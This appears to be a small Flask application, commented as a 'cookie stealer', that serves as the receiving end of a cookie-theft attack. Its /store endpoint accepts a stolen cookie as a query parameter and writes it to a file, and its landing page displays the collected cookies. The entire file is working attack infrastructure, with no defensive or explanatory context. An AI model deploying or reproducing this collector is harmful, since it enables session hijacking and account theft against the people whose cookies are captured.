from flask import render_template, request, redirect, url_for, make_response
from server import app 


'''
Landing page 
'''  
@app.route("/", methods=["POST", "GET"])
def index(): 
    # cookie stealer 
    cookies = open("cookie_file.txt", "r").readlines()
    
    return render_template('index.html', cookies=cookies) 

@app.route('/store', methods=['POST', 'GET']) 
def store_cookie(): 
    cookie = request.args.get('cookie')
    f= open("cookie_file.txt","w+")
    f.write(cookie + '\n')
    f.close()
    return "n o n e"


